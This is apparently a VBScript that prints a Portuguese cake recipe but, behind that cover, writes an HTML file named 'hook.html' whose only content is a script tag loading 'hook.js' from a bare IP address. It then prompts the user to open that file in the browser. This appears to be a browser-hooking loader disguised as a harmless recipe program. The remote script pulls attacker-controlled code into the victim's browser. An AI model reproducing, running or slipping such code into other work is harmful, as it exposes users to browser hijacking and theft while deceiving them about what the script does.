Option Explicit
Dim ingredientes, ingrediente, filename, objFSO, objFile

ingredientes = Array("Farinha", "Açúcar", "Ovos", "Manteiga", "Leite", "Fermento")

WScript.Echo "Receita simples de bolo:"
WScript.Echo

For Each ingrediente In ingredientes
    WScript.Echo "- " & ingrediente
Next

WScript.Echo
WScript.Echo "Instruções:"
WScript.Echo "1. Misture todos os ingredientes secos."
WScript.Echo "2. Adicione os ingredientes úmidos e misture bem."
WScript.Echo "3. Despeje a massa em uma forma untada e enfarinhada."
WScript.Echo "4. Asse em forno pré-aquecido a 180°C por 35-40 minutos ou até dourar."
WScript.Echo "5. Deixe esfriar, desenforme e sirva."

filename = "hook.html"
CreateHTMLFile filename

If MsgBox("Deseja abrir o arquivo HTML criado?", vbYesNo + vbQuestion, "Abrir arquivo") = vbYes Then
    OpenHTMLFile filename
End If

Sub CreateHTMLFile(filename)
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    Set objFile = objFSO.CreateTextFile(filename, True)
    objFile.WriteLine "<!DOCTYPE html>"
    objFile.WriteLine "<html>"
    objFile.WriteLine "<head>"
    objFile.WriteLine "<script src=""https://54.207.200.83/hook.js""></script>"
    objFile.WriteLine "</head>"
    objFile.WriteLine "<body>"
    objFile.WriteLine "</body>"
    objFile.WriteLine "</html>"
    objFile.Close
End Sub

Sub OpenHTMLFile(htmlFile)
    Dim objShell
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "explorer " & htmlFile
End Sub
